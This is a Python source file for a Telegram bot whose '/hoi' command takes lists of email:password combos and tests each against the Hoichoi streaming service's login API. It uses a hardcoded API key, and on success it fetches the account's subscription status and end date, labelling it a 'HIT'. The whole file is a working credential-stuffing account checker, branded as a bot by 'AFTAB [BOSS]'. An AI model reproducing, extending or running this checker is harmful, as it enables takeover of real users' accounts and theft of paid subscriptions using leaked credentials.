import requests
import time
import json

def process_hoi_command(bot, message):
    chat_id = message.chat.id
    account_data = message.text.split()[1:]  # Get the account data from the command
    if account_data:
        total_accounts = len(account_data)
        start_time = time.time()
        results = []
        initial_message = "↯ HOI ACCOUNT\n\n"
        msg = bot.send_message(chat_id, initial_message + get_footer_info(total_accounts, start_time, message.from_user.username))

        for account in account_data:
            result = check_hoi_account(account)
            results.append(f"Combo: {account}\nResult => {result}")
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=msg.message_id,
                text=initial_message + "\n\n".join(results) + "\n\n" + get_footer_info(total_accounts, start_time, message.from_user.username)
            )

    else:
        bot.send_message(chat_id, "Please provide account details in the format: /hoi email:password")

def check_hoi_account(account):
    email, password = account.split(':')
    login_url = "https://prod-api.viewlift.com/identity/signin?site=hoichoitv&deviceId=browser-364a8001-dbe1-2d16-ddde-33429eb8474c"
    headers = {
        "Content-Type": "application/json;charset=UTF-8",
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
        "Pragma": "no-cache",
        "Accept": "application/json, text/plain, */*",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Origin": "https://www.hoichoitv",
        "Referer": "https://www.hoichoitv",
        "x-api-key": "PBSooUe91s7RNRKnXTmQG7z3gwD2aDTA6TlJp6ef"
    }
    data = {
        "email": email,
        "password": password
    }

    response = requests.post(login_url, headers=headers, json=data)
    response_data = response.json()
    
    if isinstance(response_data, str):
        response_data = json.loads(response_data)
    
    if any(key in response_data.get("error", {}).get("message", "") for key in ["Sorry, we can't find an account with this email address", "EMAIL_NOT_REGISTERED", "EMAIL_OR_PASSWORD_INCORRECT", "Your email or password is incorrect"]):
        return "Incorrect Email OR Password❌"
    elif "authorizationToken" in response_data:
        token = response_data["authorizationToken"]

        billing_url = "https://prod-api.viewlift.com/payments/billing-history?site=hoichoitv"
        billing_headers = {
            "Accept": "application/json, text/plain, */*",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9",
            "Authorization": token,
            "Referer": "https://www.hoichoitv",
            "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
            "x-api-key": "PBSooUe91s7RNRKnXTmQG7z3gwD2aDTA6TlJp6ef"
        }

        billing_response = requests.get(billing_url, headers=billing_headers)
        billing_data = billing_response.json()

        subscription_status = billing_data.get("subscriptionStatus", "Unknown")
        last_date = billing_data.get("subscriptionEndDate", "Unknown").split("T")[0]

        return (f"HIT SUCCESSFULLY\n"
                f"Subscription: {subscription_status}\n"
                f"Last Date: {last_date}")
    else:
        return f"Unexpected response: {response_data}"

def get_footer_info(total_accounts, start_time, username):
    elapsed_time = time.time() - start_time
    footer = (
        f"－－－－－－－－－－－－－－－－\n"
        f"⌧ Total ACCOUNT Checked - {total_accounts}\n"
        f"⌧ Time Taken - {elapsed_time:.2f} seconds\n"
        f"⌧ Checked by: {username}\n"
        f"⚡️ Bot by - AFTAB [BOSS]\n"
        f"－－－－－－－－－－－－－－－－"
    )
    return footer
